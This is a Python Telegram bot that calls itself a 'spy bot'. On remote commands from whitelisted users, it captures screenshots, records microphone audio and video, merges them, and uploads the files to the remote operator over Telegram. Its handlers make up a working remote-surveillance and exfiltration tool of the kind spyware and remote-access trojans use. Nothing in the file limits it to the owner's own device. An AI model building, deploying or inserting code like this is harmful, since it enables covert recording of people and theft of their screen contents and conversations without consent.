from utils import * 
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = getEnv('TOKEN')
ALLOWED_USERS = getEnv('ALLOWED_USERS', cast=int, isList=True)

bot = TeleBot(TOKEN, parse_mode='HTML')
audioRecorder = AudioRecorder()
videoRecorder = VideoRecorder()


# remind the user when a long recording in progress
class Reminder:

    def __init__(self, timeOut=10 * 60):
        self.timeOut = timeOut  # interval to notify the user
        self.timer: Timer
        self.userid: int = 0
        self.lastChatID: int = 0
        self.lastMsgID: int = 0

    def remind(self, userid: int):
        self.userid = userid
        self.timer = RepeatTimer(self.timeOut, self.nudge)
        self.timer.start()

    def nudge(self):
        if self.lastChatID:
            bot.delete_message(self.lastChatID, self.lastMsgID)
        message = bot.send_message(self.userid, "Recording in progress. Don't forget to finish")
        self.lastChatID = message.chat.id
        self.lastMsgID = message.message_id

    def cancel(self):
        self.userid = 0
        self.lastChatID = 0
        self.lastMsgID = 0
        self.timer.cancel()


remind = Reminder()


def isNotAuthorised(userID):
    if userID not in ALLOWED_USERS:
        bot.send_message(userID, "You are not authorized to use this bot")
        return True
    return False


@bot.message_handler(commands='start')
def send_welcome(message):
    user = message.from_user.id
    if isNotAuthorised(user):
        return
    bot.send_message(user, "Welcome to the spy bot")


@bot.message_handler(commands='photo')
def send_screenshot(message):
    user = message.from_user.id
    if isNotAuthorised(user):
        return

    if videoRecorder.isRunning():
        bot.send_message(user, "Video recording is in progress. Can't capture photo.")
        return

    message = bot.send_message(message.from_user.id, "Wait while the bot takes the photo")
    file = takeScreenShot()
    with open(file, 'rb') as f:
        bot.send_photo(user, f)
    bot.delete_message(message.chat.id, message.message_id)


@bot.message_handler(commands='audio')
def send_audio(message):
    user = message.from_user.id
    if isNotAuthorised(user):
        return

    if audioRecorder.isRunning():
        bot.send_message(user, "Recording already in progress.")
    else:
        audioRecorder.start()
        bot.send_message(user, "Recording in progress.", reply_markup=audioMarkup())
        remind.remind(user)


def audioMarkup():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Finish", callback_data="cb_stop_audio"),
               InlineKeyboardButton("Cancel", callback_data="cb_cancel_audio"))
    return markup


@bot.message_handler(commands='videoonly')
def send_video(message):
    user = message.from_user.id
    if isNotAuthorised(user):
        return

    if videoRecorder.isRunning():
        bot.send_message(user, "Recording already in progress.")
    else:
        videoRecorder.start()
        bot.send_message(user, "Recording in progress.", reply_markup=videoOnlyMarkup())
        remind.remind(user)


def videoOnlyMarkup():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Finish", callback_data="cb_stop_videoonly"),
               InlineKeyboardButton("Cancel", callback_data="cb_cancel_videoonly"))
    return markup


@bot.message_handler(commands='video')
def send_both(message):
    user = message.from_user.id
    if isNotAuthorised(user):
        return

    if videoRecorder.isRunning() or audioRecorder.isRunning():
        bot.send_message(user, "Recording already in progress.")
    else:
        audioRecorder.start()
        videoRecorder.start()
        bot.send_message(user, "Recording in progress.", reply_markup=videoMarkup())
        remind.remind(user)


def videoMarkup():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Finish", callback_data="cb_stop_video"),
               InlineKeyboardButton("Cancel", callback_data="cb_cancel_video"))
    return markup


@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    remind.cancel()  # clear all reminder
    user = call.from_user.id
    bot.edit_message_reply_markup(message_id=call.message.id, chat_id=call.message.chat.id, reply_markup=None)
    if call.data == "cb_stop_audio":
        if not audioRecorder.isRunning():
            bot.send_message(user, "No recording is currently in progress !!!")
            return
        message = bot.send_message(user, "Processing please wait")

        file = audioRecorder.finish()
        bot.edit_message_text("Recording saved successfully", message.chat.id, message.message_id)
        message = bot.send_message(user, "Wait while the bot uploads the audio")

        try:
            with open(file, 'rb') as f:
                bot.send_audio(user, f)
        except:
            bot.send_message(user, f"Something went wrong while uploading the audio file. You can find the audio stored as {file}")
        bot.delete_message(message.chat.id, message.message_id)

    elif call.data == "cb_cancel_audio":
        audioRecorder.terminate()
        bot.send_message(user, "Recording terminated")

    #------------------------------------------------------------------------

    elif call.data == "cb_stop_videoonly":
        if not videoRecorder.isRunning():
            bot.send_message(user, "No recording is currently in progress !!!")
            return
        message = bot.send_message(user, "Processing please wait")

        file = videoRecorder.finish()

        bot.edit_message_text("Recording saved successfully", message.chat.id, message.message_id)
        message = bot.send_message(user, "Wait while the bot uploads the video")

        try:
            with open(file, 'rb') as f:
                bot.send_video(user, f)
        except:
            bot.send_message(user, f"Something went wrong while uploading the video file. You can find the video stored as {file}")
        bot.delete_message(message.chat.id, message.message_id)

    elif call.data == "cb_cancel_videoonly":
        videoRecorder.terminate()
        bot.send_message(user, "Recording terminated")

    #-----------------------------------------------------------------
    elif call.data == "cb_stop_video":
        if not audioRecorder.isRunning() or not videoRecorder.isRunning():
            bot.send_message(user, "No recording is currently in progress !!!")
            return
        message = bot.send_message(user, "Processing please wait")

        audFile = audioRecorder.finish()
        vidFile = videoRecorder.finish()

        file = getFileName('Video', 'mp4')
        mergeFFMPEG(vidFile, audFile, file)

        bot.edit_message_text("Recording saved successfully", message.chat.id, message.message_id)
        message = bot.send_message(user, "Wait while the bot uploads the video")
        try:
            with open(file, 'rb') as f:
                bot.send_video(user, f)
        except:
            bot.send_message(user, f"Something went wrong while uploading the video file. You can find the video stored as {file}")
        bot.delete_message(message.chat.id, message.message_id)

    elif call.data == "cb_cancel_video":
        # break if fail, don't send message again
        videoRecorder.terminate()
        audioRecorder.terminate()
        bot.send_message(user, "Recording terminated")


bot.infinity_polling()